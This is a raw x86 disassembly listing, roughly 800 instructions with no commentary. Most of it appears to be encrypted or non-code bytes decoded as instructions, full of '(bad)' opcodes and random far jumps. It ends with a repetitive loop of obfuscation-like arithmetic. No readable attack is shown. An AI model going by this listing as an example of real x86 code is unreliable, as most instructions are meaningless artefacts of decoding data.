  415beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bec:	push   cs
  415bed:	leave  
  415bee:	mov    ecx,0x69c3581a
  415bf3:	lahf   
  415bf4:	pop    esp
  415bf5:	jecxz  0x415bac
  415bf7:	mov    ds:0xe955d5cd,al
  415bfc:	mov    eax,0xab0dd3e6
  415c01:	ret    0x9439
  415c04:	xor    ch,BYTE PTR [esi]
  415c06:	ror    BYTE PTR ss:[edi],1
  415c09:	cmp    eax,0x2f447c74
  415c0e:	xor    esp,DWORD PTR [ecx+0x179b43dd]
  415c14:	jle    0x415c2d
  415c16:	mov    WORD PTR [ebp-0x3f76ca50],cs
  415c1c:	adc    eax,0x64630ea4
  415c21:	or     al,0x1b
  415c23:	int3   
  415c24:	xchg   esi,eax
  415c25:	iret   
  415c26:	pop    edi
  415c27:	jge    0x415c6a
  415c29:	out    dx,eax
  415c2a:	outs   dx,DWORD PTR ds:[esi]
  415c2b:	ret    
  415c2c:	lock pop es
  415c2e:	outs   dx,BYTE PTR ds:[esi]
  415c2f:	int3   
  415c30:	mov    eax,0x2c26e474
  415c35:	mov    eax,0x3ae7724e
  415c3a:	add    al,0x95
  415c3c:	in     al,dx
  415c3d:	popf   
  415c3e:	dec    ebx
  415c3f:	mov    ecx,0x5868f9cc
  415c44:	mov    DWORD PTR [ecx+0x2f73487d],eax
  415c4a:	ins    BYTE PTR es:[edi],dx
  415c4b:	iret   
  415c4c:	leave  
  415c4d:	mov    dl,0x1d
  415c4f:	inc    edi
  415c50:	lods   al,BYTE PTR ds:[esi]
  415c51:	dec    ebp
  415c52:	ror    BYTE PTR [edx+0x25eb9b02],0xf9
  415c59:	xor    edi,esp
  415c5b:	jmp    0x415cd5
  415c5d:	push   0x43
  415c5f:	call   0x9fc4:0x4c0b1903
  415c66:	cmp    eax,0x61043d15
  415c6b:	stos   BYTE PTR es:[edi],al
  415c6c:	les    edi,FWORD PTR [edi+0x651283fd]
  415c72:	je     0x415ce0
  415c74:	inc    edi
  415c75:	add    BYTE PTR [eax],ah
  415c77:	adc    BYTE PTR [ecx-0x3a],ch
  415c7a:	mov    es,WORD PTR [esi+0x750a121f]
  415c80:	push   es
  415c81:	jb     0x415c59
  415c83:	sahf   
  415c84:	aam    0x1a
  415c86:	jb     0x415cc2
  415c88:	cmp    eax,0x6cd684bf
  415c8d:	call   0x1457:0x8c7f2c7e
  415c94:	mov    eax,ds:0x967426ab
  415c99:	inc    edi
  415c9a:	jne    0x415c7b
  415c9c:	(bad)  
  415c9d:	cs popf 
  415c9f:	or     edx,DWORD PTR [ebx-0xb]
  415ca2:	cmp    bh,al
  415ca4:	mov    dh,0xc5
  415ca6:	jno    0x415c48
  415ca8:	int    0xda
  415caa:	push   edi
  415cab:	imul   eax,DWORD PTR [edi+0x355004ae],0xffffffc9
  415cb2:	mov    ch,0x41
  415cb4:	popf   
  415cb5:	aam    0xea
  415cb7:	ret    
  415cb8:	dec    eax
  415cb9:	push   ebp
  415cba:	ret    0x5357
  415cbd:	jnp    0x415cdc
  415cbf:	(bad)  
  415cc0:	mov    al,dl
  415cc2:	retf   0xe715
  415cc5:	dec    ebp
  415cc6:	in     al,dx
  415cc7:	mov    eax,0x555f139
  415ccc:	pop    eax
  415ccd:	push   0x89b9a124
  415cd2:	icebp  
  415cd3:	sbb    ebx,DWORD PTR [ecx+eax*4+0x15]
  415cd7:	psadbw mm7,QWORD PTR [edi]
  415cda:	hlt    
  415cdb:	aaa    
  415cdc:	xchg   esi,eax
  415cdd:	pop    esp
  415cde:	sub    eax,0xabf63535
  415ce3:	lods   al,BYTE PTR ds:[esi]
  415ce4:	and    dl,bl
  415ce6:	mov    al,0xfe
  415ce8:	cwde   
  415ce9:	or     dh,BYTE PTR [eax]
  415ceb:	pop    ebp
  415cec:	mov    esp,0x19c0bbca
  415cf1:	adc    ecx,DWORD PTR [ebp-0x2c32c131]
  415cf7:	mov    ecx,0x7c965217
  415cfc:	enter  0x2036,0xfc
  415d00:	mov    BYTE PTR [edx-0x82510d2],ch
  415d06:	inc    edx
  415d07:	pushf  
  415d08:	data16 fs mov ah,0x96
  415d0c:	rcl    eax,1
  415d0e:	jo     0x415cd4
  415d10:	jo     0x415d55
  415d12:	repz adc al,BYTE PTR [esi]
  415d15:	in     al,dx
  415d16:	push   ss
  415d17:	ins    BYTE PTR es:[edi],dx
  415d18:	mov    ds:0x38beec4f,al
  415d1d:	dec    esi
  415d1e:	push   eax
  415d1f:	pop    ebp
  415d20:	mov    al,ds:0x57fb1880
  415d25:	cmp    ebx,edi
  415d27:	push   es
  415d28:	sub    ecx,eax
  415d2a:	ror    DWORD PTR [edx+0x75],1
  415d2d:	daa    
  415d2e:	and    ecx,esi
  415d30:	jb     0x415d7b
  415d32:	cld    
  415d33:	shl    DWORD PTR [ebx+0x6bbdd12d],0x35
  415d3a:	stos   DWORD PTR es:[edi],eax
  415d3b:	xchg   ecx,eax
  415d3c:	icebp  
  415d3d:	ret    
  415d3e:	cdq    
  415d3f:	adc    eax,0xbee21316
  415d44:	mov    ebp,0x736df539
  415d49:	stos   DWORD PTR es:[edi],eax
  415d4a:	mov    dh,0xc8
  415d4c:	adc    eax,DWORD PTR ds:0x4e87aaf
  415d52:	jmp    0xa96aef40
  415d57:	add    ebx,DWORD PTR [ebx]
  415d59:	dec    esp
  415d5a:	pop    eax
  415d5b:	int3   
  415d5c:	mov    ah,0xa9
  415d5e:	neg    BYTE PTR [eax]
  415d60:	or     cl,BYTE PTR ds:0x88ebd7bd
  415d66:	push   es
  415d67:	and    bh,dl
  415d69:	fist   WORD PTR [ebx-0x7a]
  415d6c:	(bad)  
  415d6d:	push   ebp
  415d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d70:	aas    
  415d71:	mov    dl,0x7f
  415d73:	inc    ebp
  415d74:	pop    eax
  415d75:	loopne 0x415d54
  415d77:	(bad)  
  415d78:	je     0x415dae
  415d7a:	mov    ds:0xb317adfa,eax
  415d7f:	fcom   QWORD PTR [ecx-0x6]
  415d82:	into   
  415d83:	add    DWORD PTR [edi-0x1a],ebp
  415d86:	dec    esp
  415d87:	sbb    al,0xab
  415d89:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d8b:	cmc    
  415d8c:	fsubr  QWORD PTR [esi+0x1c]
  415d8f:	aas    
  415d90:	into   
  415d91:	push   cs
  415d92:	fwait
  415d93:	sti    
  415d94:	ja     0x415db8
  415d96:	lods   al,BYTE PTR ds:[esi]
  415d97:	rol    BYTE PTR [edi],0x72
  415d9a:	rcr    bh,1
  415d9c:	in     al,0xb
  415d9e:	scas   al,BYTE PTR es:[edi]
  415d9f:	pushf  
  415da0:	fmul   st,st(1)
  415da2:	js     0x415dcd
  415da4:	jmp    0x59b0:0x6b0398e8
  415dab:	imul   BYTE PTR [ebp-0x76]
  415dae:	dec    ebp
  415daf:	lock jb 0x415db4
  415db2:	nop
  415db3:	aas    
  415db4:	sbb    dh,BYTE PTR [eax+edx*1]
  415db7:	mov    cl,0x1f
  415db9:	int3   
  415dba:	jbe    0x415d52
  415dbc:	ret    0xfd44
  415dbf:	les    esp,FWORD PTR [ecx+0x72]
  415dc2:	addr16 (bad) 
  415dc4:	lock mov dl,0x1b
  415dc7:	arpl   WORD PTR [ebx+0x5a],dx
  415dca:	fild   QWORD PTR [eax]
  415dcc:	cmc    
  415dcd:	data16 add bl,BYTE PTR [esi+0x43983489]
  415dd4:	(bad)  
  415dd5:	cli    
  415dd6:	call   0xed696be
  415ddb:	lods   al,BYTE PTR ds:[esi]
  415ddc:	stos   DWORD PTR es:[edi],eax
  415ddd:	shl    BYTE PTR [ebx-0x6e],1
  415de0:	test   al,0xc3
  415de2:	and    eax,0x9d92f3b4
  415de7:	adc    DWORD PTR [ebp-0x10],ecx
  415dea:	(bad)  
  415deb:	fadd   DWORD PTR [edx+0x4375d6a5]
  415df1:	jb     0x415e2c
  415df3:	sub    eax,0x990e9a4a
  415df8:	adc    BYTE PTR [edi-0x78],al
  415dfb:	adc    dh,BYTE PTR [edx-0x404b2ca6]
  415e01:	jmp    0x1e62:0x1197b771
  415e08:	test   edx,eax
  415e0a:	dec    ebp
  415e0b:	pop    es
  415e0c:	adc    dl,cl
  415e0e:	shl    DWORD PTR [esi-0x7b],0xa5
  415e12:	out    0x46,eax
  415e14:	add    eax,esp
  415e16:	inc    edx
  415e17:	xchg   ecx,eax
  415e18:	int3   
  415e19:	out    dx,al
  415e1a:	ja     0x415e01
  415e1c:	out    0x21,eax
  415e1e:	aam    0x2c
  415e20:	stos   BYTE PTR es:[edi],al
  415e21:	push   eax
  415e22:	mov    bl,0xd8
  415e24:	mov    bl,0xd1
  415e26:	mov    bh,0xd2
  415e28:	mov    edi,0xe5bfc7a0
  415e2d:	mov    edi,0xb581cd69
  415e32:	push   ecx
  415e33:	dec    ebp
  415e34:	pop    edx
  415e35:	jbe    0x415e72
  415e37:	mov    dh,0xb7
  415e39:	jo     0x415e2f
  415e3b:	dec    esp
  415e3c:	fild   DWORD PTR [eax+0x44ad0c7d]
  415e42:	imul   ecx,DWORD PTR [esi+eiz*2-0x15],0x5f
  415e47:	es push ebp
  415e49:	fidivr WORD PTR [edi+0x6aec7925]
  415e4f:	sub    eax,0x841dbf47
  415e54:	xchg   ebp,eax
  415e55:	(bad)  
  415e56:	fsubp  st(1),st
  415e58:	jmp    0xbd655d51
  415e5d:	and    cl,bl
  415e5f:	jmp    0x4b07cde9
  415e64:	ja     0x415ebf
  415e66:	in     eax,dx
  415e67:	mov    WORD PTR [ecx+ecx*4],gs
  415e6a:	shl    BYTE PTR [esi+0x24],1
  415e6d:	push   es
  415e6e:	cwde   
  415e6f:	sub    ah,ch
  415e71:	cmp    esp,DWORD PTR [edx]
  415e73:	into   
  415e74:	add    eax,0x783cfa0f
  415e79:	das    
  415e7a:	loopne 0x415ed1
  415e7c:	idiv   DWORD PTR [eax-0x74]
  415e7f:	xor    DWORD PTR [edx-0x5b15595e],0x2a
  415e86:	xor    eax,0x828b99f1
  415e8b:	lods   al,BYTE PTR ds:[esi]
  415e8c:	bound  edx,QWORD PTR [eax-0x48]
  415e8f:	adc    DWORD PTR [esi+0x76],esi
  415e92:	iret   
  415e93:	inc    edx
  415e94:	cmc    
  415e95:	inc    edx
  415e96:	fsubr  QWORD PTR [ebx-0x6d379cfc]
  415e9c:	sbb    edx,DWORD PTR [eax-0x3]
  415e9f:	mov    ebx,0x9843619a
  415ea4:	shl    DWORD PTR [edi-0x6a],cl
  415ea7:	leave  
  415ea8:	sbb    cl,dh
  415eaa:	pop    eax
  415eab:	lahf   
  415eac:	xchg   BYTE PTR [ecx-0x59],ch
  415eaf:	push   ebp
  415eb0:	out    dx,eax
  415eb1:	hlt    
  415eb2:	ins    BYTE PTR es:[edi],dx
  415eb3:	test   eax,0xb27de744
  415eb8:	cmp    cl,BYTE PTR [ebp+0x69]
  415ebb:	xlat   BYTE PTR ds:[ebx]
  415ebc:	call   FWORD PTR [ecx+0x68]
  415ebf:	add    eax,0x335d923
  415ec4:	add    al,0x9b
  415ec6:	leave  
  415ec7:	xor    esi,esi
  415ec9:	aam    0x22
  415ecb:	dec    ebx
  415ecc:	xchg   DWORD PTR [eax],ebx
  415ece:	push   ecx
  415ecf:	ficomp DWORD PTR [eax+0x3b8ac5b]
  415ed5:	pop    ebx
  415ed6:	test   BYTE PTR [ecx],bl
  415ed8:	jne    0x415e9d
  415eda:	fild   WORD PTR [edi]
  415edc:	jne    0x415ea0
  415ede:	outs   dx,BYTE PTR ds:[esi]
  415edf:	jge    0x415f17
  415ee1:	lods   al,BYTE PTR ds:[esi]
  415ee2:	mov    gs,WORD PTR [ecx-0x20]
  415ee5:	inc    ecx
  415ee6:	(bad)  
  415ee7:	cs enter 0xb861,0x58
  415eec:	nop
  415eed:	shr    DWORD PTR [esi-0x40fd61b7],0x16
  415ef4:	inc    esp
  415ef5:	sbb    bh,BYTE PTR [edx+ebp*8-0x7b663572]
  415efc:	adc    DWORD PTR [esi],eax
  415efe:	sar    DWORD PTR [ecx+0x75b08472],1
  415f04:	pop    esi
  415f05:	or     eax,DWORD PTR [ecx]
  415f07:	and    BYTE PTR [ebx+0x3f3f4278],dh
  415f0d:	inc    esi
  415f0e:	lods   eax,DWORD PTR ds:[esi]
  415f0f:	mov    esp,0x25750516
  415f14:	inc    esp
  415f15:	xchg   ebp,eax
  415f16:	and    BYTE PTR [edx+0x6e],bh
  415f19:	arpl   cx,si
  415f1b:	cld    
  415f1c:	jp     0x415f76
  415f1e:	adc    edx,DWORD PTR [ebp+0x499cf732]
  415f24:	mov    dh,0x77
  415f26:	icebp  
  415f27:	mov    BYTE PTR [edx],dh
  415f29:	aam    0x5d
  415f2b:	jo     0x415eee
  415f2d:	in     al,0xd9
  415f2f:	sub    al,0xba
  415f31:	or     DWORD PTR [ebx],ebx
  415f33:	mov    al,0x76
  415f35:	pop    ebx
  415f36:	or     ebp,DWORD PTR [ebp+0x36]
  415f39:	int    0x53
  415f3b:	xchg   BYTE PTR [edi],al
  415f3d:	push   esi
  415f3e:	retf   0x152
  415f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f42:	add    DWORD PTR [eax],0xffffff89
  415f45:	clc    
  415f46:	xor    bh,ch
  415f48:	pop    eax
  415f49:	ins    DWORD PTR es:[edi],dx
  415f4a:	sub    BYTE PTR [eax+0x7763c1e7],dl
  415f50:	push   edx
  415f51:	call   0x9b8e5ac2
  415f56:	out    dx,al
  415f57:	and    eax,0xfc851d1d
  415f5c:	push   esp
  415f5d:	or     BYTE PTR [esi],al
  415f5f:	mov    BYTE PTR [ebx],ch
  415f61:	jl     0x415fb3
  415f63:	in     al,dx
  415f64:	arpl   WORD PTR [esi],sp
  415f66:	(bad)  
  415f68:	fmul   DWORD PTR [esi-0x79]
  415f6b:	jbe    0x415f0e
  415f6d:	popa   
  415f6e:	in     eax,0x68
  415f70:	mov    DWORD PTR [eax],edi
  415f72:	aas    
  415f73:	add    cl,BYTE PTR [edx+0x7e]
  415f76:	xchg   edx,eax
  415f77:	adc    eax,0xc538144
  415f7c:	aam    0x9b
  415f7e:	xor    eax,0x8550aa17
  415f83:	pop    ss
  415f84:	jle    0x415f56
  415f86:	adc    ah,ah
  415f88:	mov    edx,0x9699e53b
  415f8d:	imul   eax,DWORD PTR [esi+0x70],0x63
  415f91:	jmp    DWORD PTR [edx-0x7a]
  415f94:	les    edx,FWORD PTR [ecx-0x11]
  415f97:	cmp    BYTE PTR [esi],dh
  415f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f9a:	inc    eax
  415f9b:	adc    DWORD PTR gs:[ebx-0x19],ecx
  415f9f:	retf   0xce90
  415fa2:	cmc    
  415fa3:	xchg   esp,eax
  415fa4:	(bad)  
  415fa5:	hlt    
  415fa6:	sbb    bl,BYTE PTR [ebx+0x56]
  415fa9:	jb     0x415f92
  415fab:	stos   DWORD PTR es:[edi],eax
  415fac:	xchg   esp,eax
  415fad:	or     ebx,esi
  415faf:	xor    ebp,DWORD PTR [edx+0x2c723a4d]
  415fb5:	inc    eax
  415fb6:	adc    bl,dl
  415fb8:	and    dh,BYTE PTR [edi+edx*1]
  415fbb:	(bad)  
  415fbd:	pop    ds
  415fbe:	add    bl,BYTE PTR [ecx-0x5633fb48]
  415fc4:	lock mov gs,esp
  415fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fc8:	fnstsw WORD PTR [ecx+0x7b]
  415fcb:	dec    ebp
  415fcc:	aaa    
  415fcd:	add    dh,bl
  415fcf:	mov    ah,0x6c
  415fd1:	sub    ecx,ebp
  415fd3:	jmp    0xe65d:0x47a3f781
  415fda:	adc    BYTE PTR [ecx],ah
  415fdc:	sub    al,0x2a
  415fde:	sub    al,0x20
  415fe0:	cmp    bl,bh
  415fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fe3:	shl    esp,1
  415fe5:	xchg   edx,eax
  415fe6:	lock jnp 0x415f9c
  415fe9:	add    cl,dh
  415feb:	rcr    DWORD PTR [esi-0x1e],1
  415fee:	cdq    
  415fef:	ins    BYTE PTR es:[edi],dx
  415ff0:	shl    DWORD PTR [edx],1
  415ff2:	jg     0x41602e
  415ff4:	inc    esp
  415ff5:	and    DWORD PTR [edx+0x7e87dae4],edx
  415ffb:	rcr    DWORD PTR [ebp+0x71],1
  415ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fff:	cmc    
  416000:	in     eax,dx
  416001:	cmp    eax,ebp
  416003:	mov    esp,0xd4c9f826
  416008:	add    al,0xcb
  41600a:	mov    al,ds:0xc3d4b9a9
  41600f:	loop   0x416061
  416011:	rol    ebp,0x21
  416014:	ds sbb dl,bh
  416017:	cmp    BYTE PTR [esi],0xb1
  41601a:	sahf   
  41601b:	jl     0x41603d
  41601d:	popf   
  41601e:	popf   
  41601f:	push   0xfffffff3
  416021:	mov    edx,0x8b1bbea9
  416026:	pop    es
  416027:	xor    DWORD PTR [ebx+0x64],ebp
  41602a:	lock aas 
  41602c:	jmp    0x8e00:0xe232753e
  416033:	push   ebx
  416034:	inc    esi
  416035:	loop   0x41601c
  416037:	ficomp DWORD PTR [eax-0x18]
  41603a:	jbe    0x416018
  41603c:	fld    DWORD PTR [edx]
  41603e:	adc    ebp,ebx
  416040:	jp     0x416093
  416042:	fcmovnu st,st(0)
  416044:	(bad)  
  416045:	sub    DWORD PTR ds:0xa028f048,0xb13657d6
  41604f:	push   ecx
  416050:	aaa    
  416051:	in     al,dx
  416052:	jns    0x416066
  416054:	jmp    0x8685:0x404a68bd
  41605b:	ds in  al,dx
  41605d:	inc    ebp
  41605e:	add    al,0xd1
  416060:	std    
  416061:	rol    BYTE PTR [ebx],0xd3
  416064:	pop    ebx
  416065:	jg     0x416064
  416067:	int3   
  416068:	lock test al,0x3a
  41606b:	jmp    0xa109000c
  416070:	mov    ebx,DWORD PTR [ebx-0x93f98a9]
  416076:	or     eax,esi
  416078:	loopne 0x416093
  41607a:	xor    DWORD PTR [ebp-0x4daac6d1],ebx
  416080:	shl    ah,0xf5
  416083:	loope  0x4160f7
  416085:	and    al,0x12
  416087:	dec    ecx
  416088:	xor    BYTE PTR [ebx],al
  41608a:	mov    edx,ebp
  41608c:	out    0xbd,eax
  41608e:	cmc    
  41608f:	xor    DWORD PTR ds:0x4484a606,esi
  416095:	sub    al,0x15
  416097:	arpl   WORD PTR [ebp-0x6a],bp
  41609a:	neg    BYTE PTR ss:[esi+0x2b08ea93]
  4160a1:	push   esi
  4160a2:	(bad)  
  4160a3:	jbe    0x4160d9
  4160a5:	add    DWORD PTR [ebx+0x54],eax
  4160a8:	stos   DWORD PTR es:[edi],eax
  4160a9:	dec    ebx
  4160aa:	sub    ah,cl
  4160ac:	jg     0x4160b4
  4160ae:	cmp    al,0xeb
  4160b0:	data16 xor al,0x14
  4160b3:	sub    ah,bl
  4160b5:	dec    esi
  4160b6:	les    ecx,FWORD PTR [edx+0x4fb271e0]
  4160bc:	inc    edx
  4160bd:	retf   
  4160be:	xlat   BYTE PTR ds:[ebx]
  4160bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160c0:	je     0x41609b
  4160c2:	scas   al,BYTE PTR es:[edi]
  4160c3:	retf   0xea8f
  4160c6:	pop    edi
  4160c7:	dec    esp
  4160c8:	add    al,0x61
  4160ca:	mov    al,0xc2
  4160cc:	xchg   ebx,eax
  4160cd:	adc    ah,ah
  4160cf:	in     al,0xad
  4160d1:	sub    ecx,DWORD PTR [edx]
  4160d3:	pop    edi
  4160d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d5:	lock and bl,bl
  4160d8:	(bad)  
  4160d9:	xor    dh,bh
  4160db:	jo     0x41606f
  4160dd:	in     al,0x96
  4160df:	and    bh,BYTE PTR [ecx-0x3f5aa951]
  4160e5:	sub    eax,0x1a720583
  4160ea:	fucomip st,st(6)
  4160ec:	cmp    BYTE PTR [ebx+0x2c],cl
  4160ef:	pop    esi
  4160f0:	arpl   WORD PTR [esi],cx
  4160f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160f3:	les    esi,FWORD PTR [edx]
  4160f5:	imul   ecx,eax,0x2a
  4160f8:	lods   eax,DWORD PTR ds:[esi]
  4160f9:	fimul  WORD PTR [esi-0x2e]
  4160fc:	lds    eax,FWORD PTR [edi+0x39]
  4160ff:	int3   
  416100:	mov    esi,0xc62b4703
  416105:	or     ebx,DWORD PTR [ebx+0x5b981a07]
  41610b:	aaa    
  41610c:	add    al,BYTE PTR [eax+edi*4-0x2c]
  416110:	dec    eax
  416111:	and    bl,0x12
  416114:	test   al,0x19
  416116:	dec    edx
  416117:	fstp   DWORD PTR [edi]
  416119:	mov    edx,0x31e8e6c8
  41611e:	sub    BYTE PTR [esi+eax*8],dl
  416121:	sbb    eax,0xee6e6533
  416126:	sub    BYTE PTR ds:[eax+0x47],dh
  41612a:	xchg   DWORD PTR [edi-0x1f],ebp
  41612d:	jmp    0x1734:0x90b94c1e
  416134:	enter  0x2607,0x79
  416138:	xlat   BYTE PTR ds:[ebx]
  416139:	out    dx,al
  41613a:	xor    bh,al
  41613c:	dec    eax
  41613d:	addr16 or al,0xb9
  416140:	sbb    cl,BYTE PTR [edx]
  416142:	cmp    al,0x70
  416144:	jmp    0x900b:0xaa0a7048
  41614b:	pushf  
  41614c:	mov    ch,bl
  41614e:	and    al,0x6b
  416150:	xchg   esp,eax
  416151:	inc    ebp
  416152:	xor    al,BYTE PTR [esi]
  416154:	sbb    ch,BYTE PTR [eax]
  416156:	jne    0x416168
  416158:	xchg   BYTE PTR [esi+eiz*4],bl
  41615b:	push   esp
  41615c:	cmp    ch,BYTE PTR [ecx-0x5eea4b1c]
  416162:	call   0x7b18a4ea
  416167:	outs   dx,DWORD PTR ds:[esi]
  416168:	sub    DWORD PTR [edx-0x341dc799],ebp
  41616e:	aaa    
  41616f:	sub    eax,0x22384372
  416174:	call   0x92f1f7b4
  416179:	jmp    0x41613e
  41617b:	inc    ecx
  41617c:	add    al,0x12
  41617e:	fdiv   st(7),st
  416180:	sub    ecx,ebx
  416182:	jmp    0xdfca:0xceb4cb70
  416189:	mov    ds:0x111d5acd,al
  41618e:	in     eax,0x67
  416190:	or     eax,0x2796b894
  416195:	ins    DWORD PTR es:[edi],dx
  416196:	gs add al,0xca
  416199:	repnz shr DWORD PTR [ebx-0x26],0xdd
  41619e:	(bad)  
  41619f:	pusha  
  4161a0:	adc    eax,0x9cb5a1d8
  4161a5:	mov    dl,0x74
  4161a7:	pop    ebx
  4161a8:	lods   al,BYTE PTR ds:[esi]
  4161a9:	xchg   edx,eax
  4161aa:	cwde   
  4161ab:	sar    edx,cl
  4161ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161ae:	cmc    
  4161af:	sub    eax,0xfe955c45
  4161b4:	(bad)  
  4161b5:	stos   DWORD PTR es:[edi],eax
  4161b6:	jns    0x416183
  4161b8:	pmaxub mm3,QWORD PTR [edx+0x5841a720]
  4161bf:	sahf   
  4161c0:	pop    ebx
  4161c1:	(bad)  
  4161c3:	or     eax,0xccb6c73c
  4161c8:	jmp    0x416234
  4161ca:	or     al,0x15
  4161cc:	jno    0x416207
  4161ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161cf:	popf   
  4161d0:	rcl    DWORD PTR [esi+0x127a109c],1
  4161d6:	fist   WORD PTR [eax+esi*4+0x812fe3c]
  4161dd:	pushf  
  4161de:	add    DWORD PTR [ebp+0x4869bf95],edi
  4161e4:	add    al,BYTE PTR [eax]
  4161e6:	jae    0x4161ef
  4161e8:	lahf   
  4161e9:	addr16 jp 0x4161b6
  4161ec:	sbb    al,0x2e
  4161ee:	and    eax,0x916c2cd0
  4161f3:	es push edx
  4161f5:	(bad)  
  4161f6:	daa    
  4161f7:	ret    
  4161f8:	lods   eax,DWORD PTR ds:[esi]
  4161f9:	dec    edi
  4161fa:	stc    
  4161fb:	test   eax,0x1908fbc
  416200:	retf   0x418e
  416203:	cli    
  416204:	sbb    edx,DWORD PTR [ebp+0x34db6183]
  41620a:	mov    edi,0x2973e53a
  41620f:	loop   0x416279
  416211:	jg     0x4161a6
  416213:	ds mov edi,0x73575ae6
  416219:	jg     0x4161b3
  41621b:	call   0xcc3f:0x710363cf
  416222:	and    ecx,0x86014bee
  416228:	adc    DWORD PTR [ecx+eiz*2-0x5ae7291c],ebp
  41622f:	std    
  416230:	aas    
  416231:	stos   DWORD PTR es:[edi],eax
  416232:	hlt    
  416233:	mov    ebp,DWORD PTR [esi+0x64]
  416236:	add    edi,DWORD PTR [edi-0x3]
  416239:	ret    
  41623a:	(bad)  
  41623b:	stos   DWORD PTR es:[edi],eax
  41623c:	aas    
  41623d:	pop    ecx
  41623e:	sub    ebp,DWORD PTR fs:[ebx-0x23]
  416242:	mov    edi,0x873db652
  416247:	mov    edx,0x21569b40
  41624d:	jae    0x4162ae
  41624f:	test   al,0x50
  416252:	in     eax,0xe6
  416254:	xlat   BYTE PTR ds:[ebx]
  416255:	mov    ch,0xf4
  416257:	fstp   QWORD PTR [eax+0x1205e8d7]
  41625d:	or     BYTE PTR [ebx],cl
  41625f:	mov    ebx,edi
  416261:	cwde   
  416262:	lods   eax,DWORD PTR ds:[esi]
  416263:	shl    DWORD PTR [eax+0x18075274],1
  416269:	jns    0x416230
  41626b:	or     al,BYTE PTR [ebp+0x48]
  41626e:	mov    ecx,0xfd129297
  416273:	sti    
  416274:	xchg   BYTE PTR [ecx+0x1f11f289],bh
  41627a:	xor    eax,0x352000ce
  41627f:	xchg   edx,eax
  416280:	scas   eax,DWORD PTR es:[edi]
  416281:	pop    esp
  416282:	fwait
  416283:	(bad)  
  416284:	rol    DWORD PTR [ebx],1
  416286:	scas   eax,DWORD PTR es:[edi]
  416287:	loope  0x41625c
  416289:	mov    eax,ds:0x8c012a7
  41628e:	ja     0x416259
  416290:	adc    ah,BYTE PTR [edx+0x49]
  416293:	pop    esi
  416294:	ins    BYTE PTR es:[edi],dx
  416295:	xchg   esp,eax
  416296:	or     ebx,DWORD PTR [edx-0x7c]
  416299:	mov    DWORD PTR [ebp-0x58],edx
  41629c:	mov    edx,DWORD PTR [ebp+0x8]
  41629f:	mov    ebx,DWORD PTR [ebp-0x54]
  4162a2:	add    edx,0x64f8da
  4162a8:	or     edx,ebx
  4162aa:	mov    DWORD PTR [ebp-0x54],edx
  4162ad:	mov    edx,DWORD PTR [ebp+0x8]
  4162b0:	mov    ebx,DWORD PTR [ebp-0x50]
  4162b3:	add    edx,ecx
  4162b5:	xor    edx,ebx
  4162b7:	mov    DWORD PTR [ebp-0x50],edx
  4162ba:	mov    edx,DWORD PTR [ebp+0x8]
  4162bd:	mov    ebx,DWORD PTR [ebp-0x4c]
  4162c0:	add    edx,edi
  4162c2:	and    edx,ebx
  4162c4:	mov    DWORD PTR [ebp-0x4c],edx
  4162c7:	mov    edx,DWORD PTR [ebp+0x8]
  4162ca:	mov    ebx,DWORD PTR [ebp-0x48]
  4162cd:	lea    edx,[ebx+edx*1+0x241fc1f]
  4162d4:	mov    DWORD PTR [ebp-0x48],edx
  4162d7:	mov    edx,DWORD PTR [ebp+0x8]
  4162da:	mov    ebx,0xfa5e15e2
  4162df:	sub    ebx,edx
  4162e1:	add    ebx,DWORD PTR [ebp-0x44]
  4162e4:	mov    DWORD PTR [ebp-0x44],ebx
  4162e7:	mov    edx,DWORD PTR [ebp+0x8]
  4162ea:	xor    edx,eax
  4162ec:	add    edx,esi
  4162ee:	jne    0x413ef1
  4162f4:	mov    edx,DWORD PTR [ebp-0x14]
  4162f7:	mov    DWORD PTR [ebp+0x8],edx
  4162fa:	jmp    0x41636f
  4162ff:	mov    edx,DWORD PTR [ebp+0x8]
  416302:	mov    ebx,DWORD PTR [ebp-0x8]
  416305:	xor    edx,eax
  416307:	xor    ebx,eax
  416309:	sub    edx,ebx
  41630b:	sub    edx,esi
  41630d:	xor    edx,eax
  41630f:	mov    DWORD PTR [ebp+0x8],edx
  416312:	mov    edx,DWORD PTR [ebp+0x8]
  416315:	mov    ebx,DWORD PTR [ebp-0x58]
  416318:	add    edx,0x5708f8
  41631e:	imul   edx,ebx
  416321:	mov    DWORD PTR [ebp-0x58],edx
  416324:	mov    edx,DWORD PTR [ebp+0x8]
  416327:	mov    ebx,DWORD PTR [ebp-0x54]
  41632a:	add    edx,0x64f8da
  416330:	or     edx,ebx
  416332:	mov    DWORD PTR [ebp-0x54],edx
  416335:	mov    edx,DWORD PTR [ebp+0x8]
  416338:	mov    ebx,DWORD PTR [ebp-0x50]
  41633b:	add    edx,ecx
  41633d:	xor    edx,ebx
  41633f:	mov    DWORD PTR [ebp-0x50],edx
  416342:	mov    edx,DWORD PTR [ebp+0x8]
  416345:	mov    ebx,DWORD PTR [ebp-0x4c]
  416348:	add    edx,edi
  41634a:	and    edx,ebx
  41634c:	mov    DWORD PTR [ebp-0x4c],edx
  41634f:	mov    edx,DWORD PTR [ebp+0x8]
  416352:	mov    ebx,DWORD PTR [ebp-0x48]
  416355:	lea    edx,[ebx+edx*1+0x241fc1f]
  41635c:	mov    DWORD PTR [ebp-0x48],edx
  41635f:	mov    edx,DWORD PTR [ebp+0x8]
  416362:	mov    ebx,0xfa5e15e2
  416367:	sub    ebx,edx
  416369:	add    ebx,DWORD PTR [ebp-0x44]
  41636c:	mov    DWORD PTR [ebp-0x44],ebx
  41636f:	mov    edx,DWORD PTR [ebp+0x8]
  416372:	xor    edx,eax
  416374:	add    edx,esi
  416376:	jne    0x4162ff
